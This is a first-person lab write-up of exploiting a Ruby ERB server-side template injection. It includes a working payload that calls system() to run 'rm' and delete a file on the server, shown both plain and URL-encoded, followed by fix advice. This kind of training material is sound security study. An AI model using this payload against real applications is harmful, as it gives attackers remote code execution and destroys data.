# How I Found My Way into a Server-Side Template Injection

## What Lab I Was Working On

**Lab:** Basic Server-Side Template Injection
**Category:** Server-Side Template Injection (SSTI)
**Difficulty:** Practitioner
**Status:** Solved

## What I Needed to Do

I was working on a lab where the application had a Server-Side Template Injection vulnerability because it was building an ERB template in an unsafe way. My goal was to exploit that SSTI flaw and run a system command that would delete this file:

```text
/home/carlos/morale.txt
```

---

## How I Found the Vulnerability

I started by looking at how the application handled user input. It turned out the app was rendering whatever I gave it directly inside an ERB template. That meant anything I sent through the right parameter would be evaluated by the Ruby template engine on the server, which opened the door to executing arbitrary Ruby expressions and eventually getting remote code execution.

---

## How I Exploited It

### Step 1: Finding the Injection Point

While I was browsing product details, I noticed the page was using a `message` parameter to display content. I saw URLs like this:

```text
/?message=Unfortunately this product is out of stock
```

That looked like a good place to start testing.

---

### Step 2: Confirming SSTI

I decided to throw a simple math expression at it to see if the template engine would evaluate it. I injected:

```erb
<%= 7*7 %>
```

When I URL-encoded it:

```text
%3C%25%3D+7*7+%25%3E
```

The page came back showing:

```text
49
```

That confirmed it — the ERB engine was running my input, which meant SSTI was alive and well.

---

### Step 3: Getting Code Execution

Once I knew the template engine was evaluating my input, I reached for Ruby's `system()` function to run an OS command. I crafted this payload:

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

URL-encoded, it looked like:

```text
%3C%25%3D+system(%22rm+/home/carlos/morale.txt%22)+%25%3E
```

I sent that through the vulnerable `message` parameter and waited to see what happened.

---

## What I Used

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

---

## What Happened

The app ran my command and deleted the target file:

```text
/home/carlos/morale.txt
```

The lab lit up as solved.

---

## Screenshots

### When the SSTI Confirmed (7 × 7 = 49)

![SSTI Confirmation](images/ssti-confirmation.png)

### Lab Solved

![Lab Solved](images/lab-solved.png)

---

## Why This Matters

Server-Side Template Injection is dangerous because it can let an attacker:

* Execute arbitrary server-side code
* Access sensitive files
* Read environment variables
* Execute operating system commands
* Gain full remote code execution
* Completely compromise the application server

---

## How to Fix It

* Never render user input directly inside templates.
* Use safe template rendering methods.
* Disable dangerous template features when possible.
* Apply strict input validation.
* Use sandboxed template environments.
* Implement least-privilege permissions for application processes.

---

## What I Learned

Server-Side Template Injection is often a straight path to Remote Code Execution. Any user-controlled data that gets rendered by a template engine should be treated as dangerous and never evaluated without proper sanitization.
